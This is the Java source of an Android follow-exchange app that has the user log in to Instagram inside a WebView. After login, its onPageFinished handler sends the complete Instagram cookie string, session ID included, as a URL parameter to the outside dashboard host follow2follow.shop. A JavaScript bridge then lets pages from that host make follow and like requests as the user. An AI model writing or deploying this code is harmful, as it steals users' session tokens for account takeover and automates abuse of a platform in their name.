package com.upfollow.app;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.os.Bundle;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class MainActivity extends Activity {

    private WebView webView;

    // Yahan apni hosting ka dashboard link daalein:
    private static final String HOSTING_DASHBOARD = "https://follow2follow.shop/index.php";
    
    // Seedha official Instagram login URL:
    private static final String IG_LOGIN_URL = "https://www.instagram.com/accounts/login/";

    private static final String USER_AGENT = "Mozilla/5.0 (Linux; Android 13; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36";

    @SuppressLint({"SetJavaScriptEnabled", "JavascriptInterface"})
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webView);

        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setSupportZoom(false);
        settings.setUserAgentString(USER_AGENT);

        // Enable Cookies
        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.setAcceptThirdPartyCookies(webView, true);

        // 1. ATTACH NATIVE ANDROID BRIDGE (For Zero-CORS Client Execution)
        webView.addJavascriptInterface(new WebAppInterface(), "Android");

        // 2. WebViewClient Setup
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);

                // Jab user login karke Instagram feed par pahunch jaye
                if (url != null && (url.equals("https://www.instagram.com/") || url.contains("instagram.com/?") || url.equals("https://www.instagram.com"))) {
                    
                    String cookies = CookieManager.getInstance().getCookie("https://www.instagram.com");

                    if (cookies != null && cookies.contains("sessionid")) {
                        try {
                            String encodedCookies = URLEncoder.encode(cookies, "UTF-8");
                            webView.loadUrl(HOSTING_DASHBOARD + "?cookies=" + encodedCookies);
                        } catch (Exception e) {
                            webView.loadUrl(HOSTING_DASHBOARD);
                        }
                    }
                }
            }
        });

        // 3. Auto-Login Check: Agar pehle se login cookie hai toh direct Dashboard kholein
        String savedCookies = CookieManager.getInstance().getCookie("https://www.instagram.com");
        if (savedCookies != null && savedCookies.contains("sessionid")) {
            webView.loadUrl(HOSTING_DASHBOARD);
        } else {
            webView.loadUrl(IG_LOGIN_URL);
        }
    }

    // ===================================================================
    // NATIVE BRIDGE: Executes Follow/Like using Phone's Mobile Network IP
    // ===================================================================
    public class WebAppInterface {

        @JavascriptInterface
        public boolean executeInstagramAction(String targetNumericId, String actionType) {
            HttpURLConnection conn = null;
            try {
                String urlStr;
                String postData;

                if ("like".equalsIgnoreCase(actionType)) {
                    urlStr = "https://www.instagram.com/api/v1/web/likes/" + targetNumericId + "/like/";
                    postData = "media_id=" + targetNumericId;
                } else {
                    // Modern Follow Endpoint
                    urlStr = "https://www.instagram.com/api/v1/friendships/create/" + targetNumericId + "/";
                    postData = "user_id=" + targetNumericId + "&container_module=profile";
                }

                URL url = new URL(urlStr);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(8000);
                conn.setReadTimeout(10000);

                // Phone ke WebView cookie storage se cookies nikaalna
                String cookies = CookieManager.getInstance().getCookie("https://www.instagram.com");
                String csrf = "";
                if (cookies != null) {
                    conn.setRequestProperty("Cookie", cookies);
                    for (String piece : cookies.split(";")) {
                        String[] pair = piece.trim().split("=");
                        if (pair.length == 2 && "csrftoken".equalsIgnoreCase(pair[0])) {
                            csrf = pair[1];
                            break;
                        }
                    }
                }

                // Native Headers Setup (No CORS restriction in Android Native)
                conn.setRequestProperty("User-Agent", USER_AGENT);
                conn.setRequestProperty("X-IG-App-ID", "936619743392459");
                conn.setRequestProperty("X-ASBD-ID", "129477");
                conn.setRequestProperty("X-CSRFToken", csrf);
                conn.setRequestProperty("X-Requested-With", "XMLHttpRequest");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setRequestProperty("Origin", "https://www.instagram.com");
                conn.setRequestProperty("Referer", "https://www.instagram.com/");

                // Write POST Body
                byte[] postBytes = postData.getBytes(StandardCharsets.UTF_8);
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(postBytes);
                    os.flush();
                }

                int code = conn.getResponseCode();
                InputStream is = (code >= 200 && code < 400) ? conn.getInputStream() : conn.getErrorStream();
                String responseBody = readStream(is);

                // Agar Instagram ne success (status: ok ya following: true) return kiya
                return (code == 200) && (responseBody.contains("\"status\":\"ok\"") || responseBody.contains("\"following\":true"));

            } catch (Exception e) {
                e.printStackTrace();
                return false;
            } finally {
                if (conn != null) {
                    conn.disconnect();
                }
            }
        }

        private String readStream(InputStream is) {
            if (is == null) return "";
            try {
                BufferedReader reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line);
                }
                reader.close();
                return sb.toString();
            } catch (Exception e) {
                return "";
            }
        }
    }

    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
